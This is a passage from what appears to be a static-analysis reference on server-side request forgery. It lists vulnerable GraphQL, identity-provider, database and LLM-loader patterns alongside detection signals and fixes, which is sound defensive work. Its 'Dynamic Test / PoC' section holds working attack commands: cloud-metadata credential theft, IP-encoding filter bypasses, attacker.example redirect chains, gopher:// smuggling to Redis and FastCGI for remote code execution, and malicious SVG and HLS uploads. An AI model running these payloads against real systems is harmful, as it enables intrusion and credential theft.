2. **URL template interpolating field arguments / session / headers into host or path.** Gateways let you template the upstream URL with placeholders — Tyk UDG / WunderGraph `:id` and `{{.arguments.x}}` / `{{.object.id}}`, StepZen `@rest(endpoint: "…$args…")`, Hasura REST-connector `{{$base_url}}/{{…}}`, GraphQL Mesh / `@omnigraph` operation paths, **AWS AppSync HTTP resolvers** (`resourcePath: \`/v1/users/${ctx.args.id}\`` / VTL `"resourcePath": $util.toJson("/.../$ctx.args.x")` joined to the data-source endpoint), **Apollo Connectors** `@connect(http: { GET: "…{$args.id}…" })` (and — when no `@source(baseURL:)` is set — the `URLPathTemplate` is a **full URL**, so an `$args`-derived value in host position is direct SSRF), and **Dgraph** `@custom(http: { url: "https://api/$id", … })` / `@lambda`. If a user-controlled value lands in the **authority** (host) position, or in the **first path segment** of a base-relative resolve, or is not URL-encoded (Hasura explicitly requires `escapeUri()`; AppSync `$util.toJson`/`$util.urlEncode` on templated values), the attacker rebases the request: host injection, `@`-userinfo confusion (`{{base}}@evil.com`), absolute/`//` override, or extra-segment SSPP (`../`, `?`, `#`). Severity by placeholder position: a placeholder that **occupies, or can break out to, the host/authority or scheme** (e.g. `http://{{.arguments.host}}/...`, or a first-segment value that rebases the URL) is **high-severity SSRF (CWE-918)**; a placeholder confined to a *later* path segment under a fixed literal scheme+host is lower risk but still flag it if the value is not URL-encoded/allowlisted (extra-segment SSPP via `@`, `/`, `?`, `#`, `../`).
3. **Header/credential forwarding to a user-influenced upstream.** Gateways that forward the client `Authorization`/cookies to the upstream (WunderGraph header forwarding, Hasura remote-schema header pass-through, Apollo Connectors `headers: [{ name, value: "{$request.headers.authorization}" }]` / `from:`, Dgraph `forwardHeaders`/`secretHeaders`) leak those credentials to whatever host shape 1/2 selects — same credential-leak impact as axios CVE-2025-27152.

Lower-priority but same class (remote-schema/stitching executors built from a config/input URL): GraphQL-Tools / Yoga `buildHTTPExecutor({ endpoint })` / `url-loader` (`loadSchema(url)`), Hot Chocolate (.NET) `AddRemoteSchema`/HTTP stitching, Grafbase connectors `url`, and Apollo Router / Cosmo **subgraph URL override / coprocessor** when the subgraph routing URL is dynamic — flag when the endpoint is non-literal or runtime-settable.

**SAST signals**:
- Config/metadata field naming an upstream: `add_remote_schema`/`remote_schema`, action `handler`, datasource `url`/`baseURL`/`base_uri`, `@rest(endpoint:`, Mesh `baseUrl`/`@omnigraph` source, AppSync `resourcePath`, Apollo Connectors `@connect`/`@source`/`URLPathTemplate`, Dgraph `@custom(http:`/`@lambda`, stitching `buildHTTPExecutor`/`loadSchema`/`AddRemoteSchema` — whose value is **non-literal** (env-or-input-derived) or settable via a metadata/admin route, especially if that route's authz is weak/forwarded.
- URL templates with placeholders (`{{.arguments`, `{{.object`, `{{$body`, `{{$session_variables`, `:param`, `$args`, `{$args.`, `$ctx.args`/`ctx.args` in `resourcePath`, `$id`/`$<argName>` in a Dgraph `@custom` `url`) where the placeholder can occupy host/scheme/first-segment, or templated values are interpolated **without** an encode/allowlist (e.g. missing `escapeUri`/`$util.urlEncode`).
- Upstream header forwarding (`forwardClientHeaders`, `forward_client_headers`, `forwardHeaders`, `secretHeaders`, `{$request.headers`, pass-through `Authorization`) combined with any of the above.

**SAFE**: treat upstream URLs as deploy-time config from a trusted source (env/secret), not runtime/admin-settable by untrusted roles; lock down metadata/admin endpoints and `create_*`/`add_*` permissions (default-deny). For templates, keep the scheme+host **fixed and literal**, only allow placeholders in later path/query positions, URL-encode every interpolated value (`escapeUri` or equivalent), and reject values containing `@ : / \ ? #` or that parse as absolute/`//`. Re-validate the resolved host against an allowlist before fetch; do not forward client credentials to non-allowlisted hosts. Cross-ref `graphql_injection.md` (Request Forgery / resolver-layer SSRF), `server_side_request_forgery` host-allowlist + IP-pinning patterns above, and `api_security.md` (server-side parameter pollution).

## Identity-Provider URL Fetch (OIDC / OAuth / SAML — discovery, JWKS, metadata, `request_uri`)

A federated-login backend **fetches URLs that the identity provider (or a tenant admin) supplies**, and those URLs are attacker-influenceable whenever an attacker can register/configure an IdP, run a "test connection / discover" action, or control the issuer a token claims. The fetch is server-to-server with no user in the loop, so it is classic SSRF — but it hides behind auth-library calls (`Issuer.discover`, `jwksClient`, SAML metadata parse), so a grep-for-`fetch` scan misses it. This is a very common, high-impact surface (IMDS theft, internal port scan, key substitution).

**Attacker-controlled URL sources to flag** (each is fetched server-side):
- **OIDC discovery**: `<issuer>/.well-known/openid-configuration` where the issuer/discovery URL comes from tenant config, a "run discovery" admin action, or (worst) the `iss` claim of an unverified token. Real: **Amazon Cognito "Run discovery"** allowed `localhost`/IMDS issuers; **sigstore/fulcio** followed cross-host redirects from discovery (blind SSRF + JWKS substitution + k8s SA-token leak, GHSA-f5mr-q85p-6hh6).
- **`jwks_uri` / `token_endpoint` / `userinfo_endpoint` / `registration_endpoint`** read **out of the discovery document** and then fetched — a malicious discovery doc points these at `http://127.0.0.1:…` / `http://169.254.169.254/…`.
- **OIDC `request_uri`** (pushed/by-reference request objects) and **OAuth `logo_uri`/`jwks_uri`/`sector_identifier_uri`** in dynamic client registration — server dereferences a client-supplied URL.
- **SAML metadata URL** (IdP/SP metadata fetched by URL) and **`AssertionConsumerServiceURL`**-style callback fetches.

**SAST signals**:
- Auth-library discovery/JWKS calls whose URL/issuer argument is **non-literal**: `Issuer.discover(`, `discoverProviderMetadata(`, `openid-configuration`, `jwksClient({ jwksUri:`, `jwks_uri`, `get_signing_key`, `PyJWKClient(`, `WellKnownOpenidConfiguration`, `MetadataAddress =` (.NET OIDC), `python3-saml`/`OneLogin` metadata-by-URL, `samlMetadataUrl`.
- The URL/issuer traces from tenant/admin config, a `test`/`discover`/`verify` endpoint, or an unverified token claim (`iss`, `request_uri`).
- Token attached **globally** by the HTTP transport (so it leaks on cross-host redirect / to the `jwks_uri` host) — see CVE-2025-27152 credential-leak pattern.

**VULN**:
```javascript
// issuer comes from tenant config / "run discovery" / token iss — fully attacker-influenceable
const issuer = await Issuer.discover(tenant.issuerUrl);            // fetches /.well-known/openid-configuration
const jwks   = jwksClient({ jwksUri: issuer.metadata.jwks_uri });  // jwks_uri read from a malicious discovery doc
// redirects followed by default + Authorization attached globally => blind SSRF + credential/IMDS leak
```

**SAFE**: allowlist issuer hosts (exact host match, not `startsWith`/suffix); require `https`; resolve-then-validate IP and **pin the connection** to the validated IP (kills the validate-then-fetch DNS-rebinding/TOCTOU window — see *DNS Rebinding* patterns above); **disable redirects** on discovery/JWKS clients or re-validate every hop against the same host; cap response size/time; attach the IdP token/credential **only** when the outgoing host exactly matches the configured issuer host (never globally). Cross-ref `authentication_jwt.md` and `ssrf.md` IP-pinning patterns.

## Database-Layer SSRF (federated / remote-fetch functions & engines)

The outbound request is made by **the database**, not the app's HTTP client — so the sink is a SQL string, not `requests.get(`. Reached either directly (an exposed query interface / admin console) or, more commonly, **as a second-stage payload of SQL injection** (see `sql_injection.md`). Flag user-controlled host/URL reaching any of these remote-fetch primitives; severity is high because the DB host often sits deep in the network with IMDS/admin reachability.

| Engine | Remote-fetch primitive (SSRF/XSPA sink) |
|--------|------------------------------------------|
| PostgreSQL | `dblink('host=… port=…', …)` / `dblink_connect`, `postgres_fdw` server `host`/`port`, `COPY … FROM PROGRAM 'curl …'`, extensions `http`/`pgsql-http` (`http_get(url)`) |
| MySQL/MariaDB | `FEDERATED` engine `CONNECTION='mysql://user@host:port/…'`, `LOAD DATA [LOCAL] INFILE`/`LOAD_FILE` to UNC, HTTP UDFs |
| MSSQL | `OPENROWSET`/`OPENDATASOURCE` (provider connection string), linked servers (`sp_addlinkedserver`), `xp_dirtree`/`xp_fileexist` to UNC (NTLM-relay/port-probe), `SQLHttp` CLR |
| Oracle | `UTL_HTTP.request`, `UTL_TCP`, `HTTPURITYPE(url).getclob()`, `DBMS_LDAP.init`, `UTL_SMTP`, `DBMS_SCHEDULER` external jobs |
| ClickHouse | `url('http://…', format)` table function, `postgresql(host:port,…)`/`mysql(…)`/`mongodb(…)` table functions, `URL`/`PostgreSQL` table engines, `url_base` relative-resolve |
| DuckDB / analytics | `httpfs` `read_csv('http://…')`/`read_parquet('s3://…')`, `INSTALL`/`LOAD` from URL; Spark/Presto/Trino external tables & connector URLs |
| MongoDB | `$out`/`$merge` to a connection string, `$lookup` against a configured remote |

**SAST signals**: any of the above primitives whose host/URL/connection-string argument is **non-literal** (built from a parameter, request field, or concatenated SQL); `FROM PROGRAM`, `OPENROWSET(`, `UTL_HTTP`, `dblink(`, `CONNECTION='`, `http_get(`, `url(` in a query builder string; user input flowing into a connection DSN. Also treat as the impact-amplifier of any SQLi finding.

**SAFE**: don't expose these primitives to app-tier roles (revoke `dblink`/`http`/`FEDERATED`/`UTL_HTTP` execute; least-privilege DB account — see `sql_injection.md`); never build connection strings/URLs from user input; if federation is required, pin remote hosts to a deploy-time allowlist and run the DB with egress firewalling so it cannot reach IMDS/localhost/RFC1918.

## LLM / RAG Document Loaders & Agent "Fetch URL" Tools

Modern AI features fetch URLs server-side: RAG **document loaders** ingest a user-supplied URL, web-crawler loaders **recursively follow links found in fetched pages** (so the taint source is *page content*, not just the initial arg), multimodal token-counting/vision paths fetch `image_url`, and **agent tools** ("browse", "fetch", "http_request") let the model hit arbitrary URLs from a prompt. All are SSRF sinks; several shipped real CVEs.

**Affected/known patterns to flag**:
- **LangChain** — `RecursiveUrlLoader` `preventOutside` used `startsWith` (subdomain/prefix bypass) + no private-IP block (CVE-2026-26019 / GHSA-gf3v-fwqg-4vh7); `WebBaseLoader`, `AsyncHtmlLoader`, `UnstructuredURLLoader`, `SeleniumURLLoader`; `image_url` token counting `_url_to_size()` → `httpx.get` with validate-then-fetch DNS-rebinding (GHSA-r7w7-9xr2-qq2r, GHSA-2g6r-c272-w58r); `RequestsGetTool`/`requests` toolkit.
- **LlamaIndex** — `SimpleWebPageReader`, `BeautifulSoupWebReader`, `download_loader(...)`, `TrafilaturaWebReader`.
- **Generic** — any agent/tool function (`fetch`, `browse`, `http_request`, `read_url`, `scrape`) whose URL arg is model/prompt-derived; multimodal `image_url`/`document_url` passed to a fetcher for size/preview.

**SAST signals**: loader/tool constructors and methods above with a **non-literal URL** that traces from request body, prompt, tool-call arguments, or *crawled page content*; origin checks done with `startsWith`/suffix instead of `new URL(x).origin === base.origin`; `validate…then httpx.get/fetch` with a **separate** DNS resolution (TOCTOU); redirects left enabled; no private-IP/metadata block.

**VULN**:
```python
# url (and every link discovered on the page) is fetched with no SSRF policy
loader = RecursiveUrlLoader(url=user_url)        # follows page links → reaches 169.254.169.254 / RFC1918
docs = loader.load()
```

**SAFE**: validate **every** outbound hop (initial URL *and* discovered links) with semantic origin comparison (`new URL(link).origin === new URL(base).origin`), not `startsWith`; block private/reserved/metadata ranges and non-`http(s)` schemes; resolve DNS once and **pin** the connection to the validated IP (no validate-then-fetch); disable redirects or re-validate each hop; expose an `allow_fetching_images=False`/allowlist switch for multimodal paths. LangChain ships `validate_safe_url` / `SSRFSafeSyncTransport` — prefer the library's SSRF-safe transport over a bare client.

## Blind SSRF — Internal Gadget / Impact Catalog

Even a **blind** SSRF (no response body returned) escalates when it can reach an internal service. Use this to judge severity in triage and to justify scheme/port restrictions in remediation — a "harmless" blind fetcher on a host that can talk to Redis or FastCGI is effectively RCE.

| Internal gadget | Reached via | Escalation |
|-----------------|-------------|------------|
| Redis | `gopher://`/`dict://` :6379 | RCE — `CONFIG SET dir`+`save` to cron/`authorized_keys`/webshell |
| Memcached | `gopher://`/`dict://` :11211 | Cache poisoning, object-injection → RCE in some apps |
| FastCGI / PHP-FPM | `gopher://` :9000 | RCE via `PHP_VALUE` (`auto_prepend_file`, `allow_url_include`) |
| MySQL / PostgreSQL | `gopher://` :3306 / :5432 | Auth-less query execution where trust-local is configured |
| Docker API | `http://` :2375 / unix socket | Container create/exec → host RCE |
| Kubernetes API / kubelet | `https://` kube-api / :10250 | Pod exec, secret read → cluster takeover |
| Consul / Nomad | `http://` :8500 / :4646 | Service/script registration → RCE |
| Elasticsearch / Solr | `http://` :9200 / :8983 | Data read; Solr DataImportHandler/velocity → RCE; Solr XXE |
| Jenkins / Hudson | `http://` :8080 | Script console → RCE |
| Spring Boot Actuator | `http://` `/actuator/*` | Heap/env dump (creds), `/jolokia` → RCE |
| App servers (WebLogic/JBoss/Struts) | `http://` internal | Known unauth RCE chains (often CRLF-assisted) |
| Metrics exporters (Prometheus/Grafana) | `http://` exporter port | Data-source SSRF pivot (e.g. CVE-2020-13379) |

**SAST takeaway**: severity of any user-controlled outbound fetch should assume these gadgets are reachable unless egress is network-restricted; the presence of `gopher`/`dict`/`file` scheme support escalates blind SSRF to RCE-class.

## Dynamic Test / PoC

Confirm suspected SSRF at runtime when the endpoint is reachable:

**Cloud metadata (full-read signal)**
```bash
curl "https://app.example.com/fetch?url=http://169.254.169.254/latest/meta-data/"
# Expect: IAM role name or instance metadata in response body
```

**AWS IMDSv2 (token-required, now the default)** — IMDSv1 above returns 401 on IMDSv2-only hosts. Confirmation needs the two-step token flow, which only works if the SSRF primitive can send a `PUT` and custom headers (e.g. a full request-forging gadget):
```bash
# 1) Obtain a session token (PUT with TTL header)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# 2) Use it to read credentials
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "X-aws-ec2-metadata-token: $TOKEN"
# A GET-only SSRF that cannot set the token header cannot reach IMDSv2 — note this in triage.
```

**Internal pivot / port probe**
```bash
curl "https://app.example.com/proxy?url=http://127.0.0.1:6379/"
# Expect: Redis banner, connection error with service fingerprint, or timing difference
```

**Blind SSRF (OAST)**
```bash
curl "https://app.example.com/webhook?url=http://YOUR-COLLABORATOR.oast.fun/ssrf-test"
# Expect: DNS/HTTP callback at collaborator; no response body needed
```

**Cloud metadata — GCP / Azure**
```bash
curl "https://app.example.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
curl "https://app.example.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# GCP: add header Metadata-Flavor: Google if the app forwards request headers
# Expect: instance metadata or service-account paths in response
```

**Filter bypass (when blocklist/allowlist checks hostname only)**
```bash
# Alternate IP encodings of 169.254.169.254 (metadata)
curl "https://app.example.com/fetch?url=http://2852039166/"             # dotless decimal
curl "https://app.example.com/fetch?url=http://0xa9fea9fe/"             # dotless hex
curl "https://app.example.com/fetch?url=http://0251.0376.0251.0376/"    # dotted octal
curl "https://app.example.com/fetch?url=http://[::ffff:169.254.169.254]/"  # IPv6 v4-mapped
curl "https://app.example.com/fetch?url=http://169.254.169.254.nip.io/" # wildcard-DNS helper
# Alternate encodings of 127.0.0.1 (loopback)
curl "https://app.example.com/fetch?url=http://2130706433/"             # decimal
curl "https://app.example.com/fetch?url=http://0x7f000001/"             # hex
curl "https://app.example.com/fetch?url=http://127.1/"                  # short form
curl "https://app.example.com/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/"  # URL-encoded
# Authority / parser confusion (allowlisted host on the left)
curl "https://app.example.com/fetch?url=http://allowed.com@169.254.169.254/"
curl "https://app.example.com/fetch?url=http://169.254.169.254%2509allowed.com/"
curl "https://app.example.com/fetch?url=http://allowed.com\\@169.254.169.254/"
# Redirect + rebinding chains (allowlisted host 30x-redirects to the internal target)
curl "https://app.example.com/fetch?url=http://attacker.example/redirect?to=http://169.254.169.254/"
# Scheme switch on redirect: allowlisted http(s) host returns Location: gopher:// (escapes scheme allowlist)
curl "https://app.example.com/fetch?url=http://attacker.example/r?to=gopher://127.0.0.1:6379/_INFO"
# Fake extension: allowlisted ...jpg passes an image-only check, then 30x-redirects to metadata
curl "https://app.example.com/fetch?url=http://attacker.example/thumb.jpg"   # responds 301 Location: http://169.254.169.254/latest/meta-data/
# Non-standard 3xx code (e.g. 332) — set your redirector to emit it; permissive clients still follow
# Expect: same internal/metadata content as direct 127.0.0.1 or 169.254.169.254 probes
```

**Non-HTTP schemes (when client supports them)**
```bash
curl "https://app.example.com/fetch?url=gopher://127.0.0.1:6379/_INFO"
# Expect: Redis INFO banner or protocol-specific response
curl "https://app.example.com/fetch?url=dict://127.0.0.1:6379/INFO"
# dict:// — line-oriented probe of Redis/memcached/FTP-style services when gopher:// is unavailable
curl "https://app.example.com/fetch?url=file:///etc/passwd"
# file:// — local file disclosure (SSRF->LFI) when the client supports it
```

**Protocol smuggling via gopher (RCE primitives — write multiline backend commands)**
```bash
# Redis: CRLF-encoded command stream → CONFIG SET dir/dbfilename + SAVE (cron/authorized_keys/webshell)
curl "https://app.example.com/fetch?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A..."
# FastCGI/PHP-FPM: gopher to :9000 with PHP_VALUE (auto_prepend_file=php://input) → RCE
curl "https://app.example.com/fetch?url=gopher://127.0.0.1:9000/_%01%01..."
# Expect: side effect on the backend (key written, file created); blind — confirm via OAST or behavior
```

**SVG / media-converter SSRF (upload-driven, no url= parameter)**
```bash
# Upload an SVG whose external ref points at metadata; server-side rasterizer fetches it
printf '%s' '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://169.254.169.254/latest/meta-data/"/></svg>' > poc.svg
curl -F "file=@poc.svg" "https://app.example.com/upload-avatar"
# HLS playlist handed to a video converter pulls an attacker/internal segment
printf '%s\n' '#EXTM3U' '#EXTINF:1,' 'http://169.254.169.254/latest/meta-data/' > poc.m3u8
curl -F "file=@poc.m3u8" "https://app.example.com/convert"
# Expect: OAST callback / metadata content embedded in the rendered output
```

**Broadened cloud metadata (provider-specific)**
```bash
curl "https://app.example.com/fetch?url=http://instance-data/latest/meta-data/"              # AWS hostname alias
curl "https://app.example.com/fetch?url=http://169.254.170.2/v2/credentials/"                # AWS ECS task role
curl "https://app.example.com/fetch?url=http://169.254.169.254/metadata/v1.json"             # DigitalOcean
curl "https://app.example.com/fetch?url=http://169.254.169.254/opc/v1/instance/"             # Oracle Cloud
curl "https://app.example.com/fetch?url=http://metadata.tencentyun.com/latest/meta-data/"    # Tencent Cloud
curl "https://app.example.com/fetch?url=http://169.254.169.254/openstack/latest/meta_data.json"  # OpenStack/Huawei
```

**Internal port scan (timing/status oracle)**
```bash
for port in 80 443 8080 8443 3306 5432 6379 27017 9200; do
  curl -s -o /dev/null -w "%{http_code}:%{time_total}\n" \
    "https://app.example.com/fetch?url=http://127.0.0.1:$port/" &
done
wait
# Expect: distinct status codes or latency per open port
```

Use the parameter name observed in code (`url`, `target`, `webhook`, etc.). Restrict protocols/ports in remediation — PoC confirms reachability, not safe design.

## Common False Alarms

- Hardcoded or configuration-only outbound URLs with no path from remote input to the sink
- Internal helper/sink methods with no reachable controller passing user-controlled URL data
- Duplicate findings for the same external-input-to-sink path through a utility wrapper
- Python string built as `"https://" + userHost + ".example.com/data/"` flagged as partial SSRF when user only picks subdomain label — verify whether authority is truly attacker-controlled
- JavaScript client-side request forgery where the browser, not the server, performs the fetch — different risk class than SSRF
- Taint originating from response bodies of outbound HTTP requests (Java explicitly excludes `getInputStream()` results)

- FALSE POSITIVE guard: in `vulhub`, emit `ssrf` only when a selected representative directory is primarily an SSRF sample; do not infer SSRF from XXE, proxy, inclusion, or secondary fetch capability alone.
- FALSE POSITIVE guard: do not emit a project-level `ssrf` tag merely because an SSRF helper or vulnerable class exists. Require a mapped vulnerable route plus the same demonstrated path from user-controlled URL input to the outbound fetch.
